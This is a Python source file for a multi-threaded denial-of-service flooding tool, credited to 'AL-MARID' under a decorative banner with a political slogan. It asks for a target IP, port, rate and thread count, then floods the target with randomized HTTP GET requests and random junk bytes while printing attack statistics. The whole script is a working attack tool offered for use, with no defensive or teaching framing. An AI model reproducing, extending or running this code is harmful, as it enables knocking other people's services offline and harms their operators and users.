import os
import socket
import random
import threading
import time
import sys
import colorama
from colorama import Fore, Style

colorama.init()

def show_banner():
    dark_gray = "\033[38;5;235m"
    reset = "\033[0m"
    
    banner = f"""
{Fore.RED}▓▓▓▓▓▒░{dark_gray}██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▒░{dark_gray}████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▒░{dark_gray}██████████████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▒░{dark_gray}████████████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{dark_gray}██████████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{dark_gray}████████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{dark_gray}██████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{dark_gray}████████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{dark_gray}██████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}██████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}███████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}█████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}███████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}█████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}███████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}██████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.WHITE}████████████████████████████████████████████████████████████████████████████████████████████████████▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░
{Fore.RED}▓▓▓▓▓▒░{Fore.GREEN}▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒░

                 ═══════════════════════════════════════════════════════════════════════════════════════════════════════════╗
            ˗ˏ` ♡ ˎˊ˗                                                                                                       ║
                ███████╗██████╗ ███████╗███████╗    ██████╗  █████╗ ██╗     ███████╗███████╗████████╗██╗███╗   ██╗███████╗  ║
            ║   ██╔════╝██╔══██╗██╔════╝██╔════╝    ██╔══██╗██╔══██╗██║     ██╔════╝██╔════╝╚══██╔══╝██║████╗  ██║██╔════╝  ║
            ║   █████╗  ██████╔╝█████╗  █████╗      ██████╔╝███████║██║     █████╗  ███████╗   ██║   ██║██╔██╗ ██║█████╗    ║
            ║   ██╔══╝  ██╔══██╗██╔══╝  ██╔══╝      ██╔═══╝ ██╔══██║██║     ██╔══╝  ╚════██║   ██║   ██║██║╚██╗██║██╔══╝    ║
            ║   ██║     ██║  ██║███████╗███████╗    ██║     ██║  ██║███████╗███████╗███████║   ██║   ██║██║ ╚████║███████╗  ║
            ║   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═══╝╚══════╝
            ║                                                                                                         ˗ˏ` ♡ ˎˊ˗
            ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════

                                                     "We love you so much, Palestinian people."
           "Code by AL-MARID"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
{Style.RESET_ALL}"""
    print(banner)

def delay_print(s, delay=0.002):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(delay)

attack_stats = {
    'total_packets': 0,
    'active_threads': 0,
    'start_time': time.time(),
    'running': True
}

def enhanced_attack(ip, port, packets_per_sec):
    useragents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
    ]

    refs = [
        'http://www.google.com/search?q=',
        'http://www.bing.com/search?q=',
        'http://search.yahoo.com/search?p=',
        'https://duckduckgo.com/?q='
    ]

    accept_headers = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept: */*"
    ]

    target_str = f"{ip}:{port}"
    thread_name = threading.current_thread().name

    while attack_stats['running']:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((ip, port))

            path = f'/{random.randint(1000000, 9999999)}'
            host_header = f"Host: {ip}"
            user_agent = f"User-Agent: {random.choice(useragents)}"
            accept = random.choice(accept_headers)
            referer = f"Referer: {random.choice(refs)}{random.randint(1000000, 9999999)}"
            connection = "Connection: keep-alive"

            request = f"GET {path} HTTP/1.1\r\n{host_header}\r\n{user_agent}\r\n{accept}\r\n{referer}\r\n{connection}\r\n\r\n"

            for _ in range(packets_per_sec):
                try:
                    s.send(request.encode())
                    attack_stats['total_packets'] += 1
                    s.send(random._urandom(random.randint(1024, 4096)))
                except:
                    break

            s.close()

        except Exception as e:
            attack_stats['total_packets'] += packets_per_sec

def stats_display():
    start_time = attack_stats['start_time']
    
    while attack_stats['running']:
        elapsed_time = time.time() - start_time
        mins, secs = divmod(int(elapsed_time), 60)
        hours, mins = divmod(mins, 60)
        
        sys.stdout.write(f"\r{Fore.YELLOW}[+] Attack Running | Time: {hours:02d}:{mins:02d}:{secs:02d} | Packets: {attack_stats['total_packets']} | Threads: {attack_stats['active_threads']}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.1)

def setup_attack():
    show_banner()
    
    delay_print(f"{Fore.CYAN}[+] Checking requirements...{Style.RESET_ALL}\n")
    os.system("pip3 install colorama > /dev/null 2>&1")
    os.system("clear")
    
    show_banner()

    ip = input(f"{Fore.WHITE}[+] Target IP: {Style.RESET_ALL}")
    port = int(input(f"{Fore.WHITE}[+] Port: {Style.RESET_ALL}"))
    packets_per_sec = int(input(f"{Fore.WHITE}[+] Packet/s: {Style.RESET_ALL}"))
    threads = int(input(f"{Fore.WHITE}[+] Threads: {Style.RESET_ALL}"))

    os.system("clear")
    show_banner()
    print(f"{Fore.CYAN}\n[+] Make sure you are connected to a faster internet connection")
    delay_print(f"{Fore.GREEN}[+] Initialising the attack... Please wait...\n{Style.RESET_ALL}")

    attack_stats['active_threads'] = threads
    
    stats_thread = threading.Thread(target=stats_display)
    stats_thread.daemon = True
    stats_thread.start()
    
    for i in range(threads):
        try:
            t = threading.Thread(target=enhanced_attack, args=(ip, port, packets_per_sec))
            t.daemon = True
            t.start()
        except Exception as e:
            print(f"{Fore.RED}[!] Error starting thread {i}: {e}{Style.RESET_ALL}")
            attack_stats['active_threads'] -= 1

    print(f"\n{Fore.YELLOW}[!] Starting attack on {ip}:{port} with {threads} threads...{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Attack launched! Press Ctrl+C to stop.{Style.RESET_ALL}")

    try:
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        attack_stats['running'] = False
        elapsed_time = time.time() - attack_stats['start_time']
        mins, secs = divmod(int(elapsed_time), 60)
        hours, mins = divmod(mins, 60)
        
        print(f"\n\n{Fore.RED}[!] Attack stopped by user{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Attack Summary:")
        print(f"    - Target: {ip}:{port}")
        print(f"    - Duration: {hours:02d}:{mins:02d}:{secs:02d}")
        print(f"    - Total Packets Sent: {attack_stats['total_packets']}")
        print(f"    - Threads Used: {attack_stats['active_threads']}{Style.RESET_ALL}")
        os._exit(0)

if __name__ == "__main__":
    setup_attack()
